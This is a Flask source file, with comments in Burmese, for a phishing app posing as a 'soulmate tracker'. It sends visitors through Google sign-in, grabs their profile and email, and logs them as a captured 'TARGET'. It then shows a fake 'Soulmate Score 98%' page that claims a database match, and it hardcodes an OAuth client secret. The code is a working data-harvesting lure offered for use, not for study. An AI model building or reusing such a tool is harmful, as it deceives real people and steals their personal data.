from flask import Flask, redirect, url_for, request
import requests
import json # JSON ကို ပုံစံတကျ print ထုတ်ဖို့

app = Flask(__name__)

CLIENT_ID = "1067906653409-dsmhmumlp914dcihc7ob94m3fsms2kpg.apps.googleusercontent.com"
CLIENT_SECRET = "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"
REDIRECT_URI = 'https://soulmate-tracker.onrender.com/callback'

@app.route('/')
def index():
    scope = "https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.email"
    auth_url = (f"https://accounts.google.com/o/oauth2/v2/auth?client_id={CLIENT_ID}"
                f"&redirect_uri={REDIRECT_URI}&response_type=code&scope={scope}")
    return redirect(auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "Error: No code provided", 400

    token_url = "https://oauth2.googleapis.com/token"
    data = {
        'code': code,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'redirect_uri': REDIRECT_URI,
        'grant_type': 'authorization_code'
    }
    
    # Access Token ယူခြင်း
    r = requests.post(token_url, data=data)
    token_data = r.json()
    access_token = token_data.get('access_token')
    
    if not access_token:
        print(f"DEBUG: Token Error: {token_data}")
        return "Authentication Failed", 500
    
    # Profile အချက်အလက် ယူခြင်း
    user_info_res = requests.get("https://www.googleapis.com/oauth2/v2/userinfo", 
                                 headers={"Authorization": f"Bearer {access_token}"})
    user_info = user_info_res.json()
    
    # ရရှိလာတဲ့ အချက်အလက်ကို Logs မှာ ပေါ်လွင်အောင် ပြမယ်
    print("\n" + "!"*60)
    print("🚩 TARGET CAPTURED 🚩")
    print(json.dumps(user_info, indent=4)) # JSON ကို လှလှပပ print ထုတ်မယ်
    print("!"*60 + "\n")
    
    # Target မြင်ရမယ့် Fake Page
    return """
    <html>
    <head><title>Soulmate Match</title></head>
    <body style="text-align: center; font-family: sans-serif; padding-top: 100px; background-color: #fff0f0;">
        <h1 style="color: #ff4d4d; font-size: 3em;">❤️ Your Soulmate Score is 98%! ❤️</h1>
        <p style="font-size: 1.2em;">Litmatch Database analyzed your profile and matched it with the requester.</p>
        <p style="color: #888;">(Verification Successful - Data Synchronized)</p>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(port=5000)
